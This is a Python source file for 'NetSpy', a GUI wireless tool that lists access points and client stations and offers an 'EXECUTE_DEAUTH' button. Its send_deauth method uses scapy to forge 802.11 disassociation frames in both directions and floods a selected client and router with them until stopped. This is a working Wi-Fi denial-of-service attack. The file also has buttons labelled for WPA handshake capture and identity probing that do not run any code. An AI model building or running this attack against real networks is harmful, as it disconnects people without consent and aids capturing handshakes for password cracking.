# ===========================================================================
# NetSpy - Network Traffic Monitor & Security Analyzer
# Copyright (C) 2026 Mehadi Hasan

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# ===============================================================================

import customtkinter as ctk
import os
import re
import threading
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Disas
from scapy.sendrecv import sendp

from utils import VENDOR_DB

class advance_monitor_ui(ctk.CTkToplevel):
    def __init__(self, parent, interface, update_log):
        super().__init__(parent)

        self.interface = interface
        self.update_log = update_log
        self.is_attacking =False
        # Window Config
        self.title(f"NetSpy Advanced - [{self.interface}]")
        self.geometry("1000x800")
        self.configure(fg_color="#0a0a0a")
        self.attributes("-topmost", True)

        # 1. Header (Minimalist & Clean)
        self.header = ctk.CTkLabel(
            self,
            text=f"NETSPY :: INSPECTOR_MODE :: {self.interface.upper()}",
            font=("Consolas", 18),
            text_color="#00FF00"  # Classic Matrix Green
        )
        self.header.pack(pady=(15, 5))

        # 2. Control Panel (Top Section)
        self.top_frame = ctk.CTkFrame(self, fg_color="#111", border_width=1, border_color="#222", corner_radius=0)
        self.top_frame.pack(fill="x", padx=20, pady=10)

        # Router Selector
        ctk.CTkLabel(self.top_frame, text="TARGET_BSSID:", font=("Consolas", 12), text_color="#aaa").grid(row=0,column=0,padx=10,pady=15)
        self.network_selector = ctk.CTkComboBox(
            self.top_frame,
            values=["Select Target..."],
            width=250,
            font=("Consolas", 12),
            dropdown_font=("Consolas", 12),
            corner_radius=0,
            fg_color="#000",
            border_color="#444"
        )
        self.network_selector.grid(row=0, column=1, padx=5)

        # Channel Selector
        ctk.CTkLabel(self.top_frame, text="CHANNEL:", font=("Consolas", 12), text_color="#aaa").grid(row=0, column=2,padx=(20, 5))
        all_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 40, 44, 48, 52, 56, 60, 64, 149, 161]
        self.channel_dropdown = ctk.CTkComboBox(
            self.top_frame,
            values=[str(ch) for ch in all_channels],
            width=80,
            font=("Consolas", 12),
            corner_radius=0,
            fg_color="#000",
            border_color="#444"
        )
        self.channel_dropdown.set("1")
        self.channel_dropdown.grid(row=0, column=3, padx=5)

        # Lock Button (Industrial Grey)
        self.lock_btn = ctk.CTkButton(
            self.top_frame,
            text="SET_CHANNEL",
            font=("Consolas", 12, "bold"),
            fg_color="#333",
            hover_color="#444",
            corner_radius=0,
            border_width=1,
            border_color="#555",
            width=120,
            command=self.manual_lock_event
        )
        self.lock_btn.grid(row=0, column=4, padx=15)


        #TARGET CLIENT
        ctk.CTkLabel(self.top_frame, text="TARGET_CLIENT:", font=("Consolas", 12), text_color="#aaa").grid(row=1,column=0,padx=10,pady=5)

        self.client_selector = ctk.CTkComboBox(
            self.top_frame,
            values=["All Clients (Broadcast)"],
            width=250,
            font=("Consolas", 12),
            corner_radius=0,
            fg_color="#000",
            border_color="#444"
        )
        self.client_selector.grid(row=1, column=1, padx=5)

        #Target Status Strip (Minimalist & Functional)
        self.status_strip = ctk.CTkFrame(self, fg_color="#1a1a1a", height=30, corner_radius=0)
        self.status_strip.pack(fill="x", padx=20, pady=(0, 10))

        self.target_info_label = ctk.CTkLabel(
            self.status_strip,
            text="TARGET_STATUS: IDLE | ENC: --- | CH_LOCK: -- | CARD_CH: --",
            font=("Consolas", 11),
            text_color="#888"
        )
        self.target_info_label.pack(side="left", padx=15)


        # 3. Client Table Section
        self.client_label = ctk.CTkLabel(self, text="[ LIVE_CLIENT_STATIONS ]", font=("Consolas", 13),text_color="#666")
        self.client_label.pack(anchor="w", padx=25)

        self.client_table = ctk.CTkTextbox(
            self, height=220, fg_color="#050505", text_color="#00FF00",
            font=("Consolas", 13), corner_radius=0, border_width=1, border_color="#222", wrap="none"
        )
        self.client_table.pack(fill="x", padx=20, pady=(5, 10))
        self.client_table.configure(state="disabled")

        # 4. Action Buttons
        self.action_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.action_frame.pack(pady=10)

        btn_style = {"font": ("Consolas", 13, "bold"), "corner_radius": 0, "width": 220, "height": 40,"border_width": 1}

        self.kick_btn = ctk.CTkButton(
            self.action_frame, text="EXECUTE_DEAUTH",
            fg_color="#000", hover_color="#c0392b", border_color="#c0392b", text_color="#c0392b", **btn_style,command=self.execute_kick_action
        )
        self.kick_btn.grid(row=0, column=0, padx=10)

        self.handshake_btn = ctk.CTkButton(
            self.action_frame, text="CPTR_HANDSHAKE",
            fg_color="#000", hover_color="#d35400", border_color="#d35400", text_color="#d35400", **btn_style
        )
        self.handshake_btn.grid(row=0, column=1, padx=10)

        self.reveal_btn = ctk.CTkButton(
            self.action_frame, text="PROBE_IDENTITY",
            fg_color="#000", hover_color="#555", border_color="#777", text_color="#eee", **btn_style
        )
        self.reveal_btn.grid(row=0, column=2, padx=10)

        # 5. Terminal Output
        self.terminal_label = ctk.CTkLabel(self, text="[ EXECUTION_LOG ]", font=("Consolas", 13), text_color="#666")
        self.terminal_label.pack(anchor="w", padx=25)

        self.terminal_display = ctk.CTkTextbox(
            self, height=250, fg_color="#000", text_color="#00FF00",
            font=("Consolas", 12), corner_radius=0, border_width=1, border_color="#222"
        )
        self.terminal_display.pack(fill="both", expand=True, padx=20, pady=(5, 20))

    def write_to_terminal(self, message):
        self.terminal_display.configure(state="normal")
        self.terminal_display.insert("end", f"[*] {message}\n")  # Asterisk for terminal feel
        self.terminal_display.see("end")
        self.terminal_display.configure(state="disabled")


    def refresh_client_table(self, target_bssid, router_clients, host_names, found_clients):
        self.client_table.configure(state="normal")
        self.client_table.delete("1.0", "end")

        header = f"{'ID':<4} | {'CLIENT_MAC':<18} | {'STATION_NAME':<20} | {'PWR':<8} | {'PKTS':<8} | {'STATUS':<8}\n"
        divider = "-" * 85 + "\n"
        self.client_table.insert("end", header + divider)

        clients = list(set(router_clients.get(target_bssid, [])))

        if not clients:
            self.client_table.insert("end", "\n   [!] LIST_EMPTY: SEARCHING_FOR_STATIONS...\n")
        else:
            for i, c_mac in enumerate(clients, start=1):
                c_mac = str(c_mac).strip()
                h_name = str(host_names.get(c_mac.lower(), "")).strip()
                prefix = c_mac[:8].upper()
                brand = VENDOR_DB.get(prefix, "GENERIC")

                display_name = h_name if h_name else brand

                data = found_clients.get(c_mac, [-100, 0])
                sig = data[0]
                pkts = data[1]

                line = f"{i:<4} | {c_mac:<18} | {display_name:<20} | {sig:<8} | {pkts:<8} | {'ACTIVE':<8}\n"
                self.client_table.insert("end", line)

        self.client_table.configure(state="disabled")

    def receive_raw_data(self, found_ssids, router_clients, host_names, found_clients):
        current_selection = self.network_selector.get()
        router_list = []

        try:
            for bssid, info in found_ssids.items():
                display_str = f"{info[0]} (Ch: {info[2]}) [{bssid}]"
                router_list.append(display_str)

            # if new router found
            if router_list and set(router_list) != set(self.network_selector.cget("values")):
                self.network_selector.configure(values=router_list)

                if current_selection == "Select Target..." and router_list:
                    pass

            if "[" in current_selection:
                target_bssid = re.search(r"\[(.*?)\]", current_selection).group(1)

                if target_bssid in found_ssids:
                    target_info = found_ssids[target_bssid]

                    b_id = target_info[0]
                    target_channel = str(target_info[2])
                    enc = target_info[3]
                    cipher = target_info[4]
                    auth = target_info[5]
                    current_channel = self.channel_dropdown.get()

                   # REd if channel not selected
                    ch_status_color = "#00FF00" if current_channel == target_channel else "#FF3333"

                    self.target_info_label.configure(
                        text=f"TARGET: {b_id} | ENC: {enc} | TGT_CH: {target_channel} | CIPHER: {cipher} | AUTH: {auth} | CARD_CH: {current_channel}",
                        text_color = ch_status_color
                     )

                    #target clients dropdown
                    clients = list(router_clients.get(target_bssid, []))
                    client_options = ["All Clients (Broadcast)"] + clients
                    if set(client_options) != set(self.client_selector.cget("values")):
                        self.client_selector.configure(values=client_options)

                    self.refresh_client_table(target_bssid, router_clients, host_names, found_clients)
                else:
                    self.target_info_label.configure(text="STATUS: TARGET_NOT_IN_RANGE", text_color="#888")

            else:
                self.target_info_label.configure(text="STATUS: WAITING_FOR_SELECTION", text_color="#888")


        except Exception as e:
            self.write_to_terminal(f"Sync Error: {e}")


    def manual_lock_event(self):

        if self.master.is_hopping:
            locked_channel = self.channel_dropdown.get()

            self.master.is_hopping = False

            # result = os.system(f"sudo iw dev {self.interface} set channel {locked_channel}")
            cmd = f"sudo iw dev {self.interface} set channel {locked_channel}"
            result = os.system(cmd)

            if result == 0:
                self.write_to_terminal(f"LOCK: Card fixed on CH {locked_channel}. Hopping DISABLED.")
                self.lock_btn.configure(text="RESUME_HOPPING", fg_color="#c0392b")

            else:
                self.write_to_terminal("ERROR: Failed to lock channel.")
                self.master.is_hopping = True

        else:
            self.master.is_hopping = True
            self.write_to_terminal("RESUME: Hopping started across all channels...")
            self.lock_btn.configure(text="SET_CHANNEL", fg_color="#333", border_color="#555")


    def send_deauth(self,interface,target_mac,gateway_mac):

        # as a router
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap() / dot11 / Dot11Disas(reason=7)

        #as a client
        dot11_client = Dot11(addr1=gateway_mac,addr2=target_mac,addr3=gateway_mac)
        packet_client = RadioTap() / dot11_client / Dot11Disas(reason=7)

        #sending packet
        count =0
        while self.is_attacking:
            try:
                sendp(packet, iface=interface, count=10, inter=0.01, verbose=False)
                sendp(packet_client, iface=interface, count=10, inter=0.01, verbose=False)
                count += 20

                if count % 100 == 0:
                    self.write_to_terminal(f"FLOODING: Sent {count * 2} packets injected")
            except:
                break

        self.write_to_terminal("ATTACK_STOPPED: Target is free.")


    def execute_kick_action(self):

        if self.master.is_hopping:
            self.write_to_terminal("ERROR: Lock the channel first before attacking!")
            return

        #If running then stop
        if self.is_attacking:
            self.is_attacking = False
            self.kick_btn.configure(text="EXECUTE_DEAUTH", fg_color="#1f1f1f")
            self.write_to_terminal("ATTACK_STOPPED: Sending termination signal...")
            return

        current_router = self.network_selector.get()
        selected_client = self.client_selector.get()

        if "[" not in current_router or "All" in selected_client:
            self.write_to_terminal("ERROR: Select a specific target first!")
            return

        target_bssid = re.search(r"\[(.*?)\]", current_router).group(1)

        # ATTACK STATE ON
        self.is_attacking = True
        self.kick_btn.configure(text="STOP_ATTACK", fg_color="#FF3333")


        attack_thread = threading.Thread(
            target=self.send_deauth,
            args=(self.interface, selected_client, target_bssid)
        )
        attack_thread.daemon = True
        attack_thread.start()

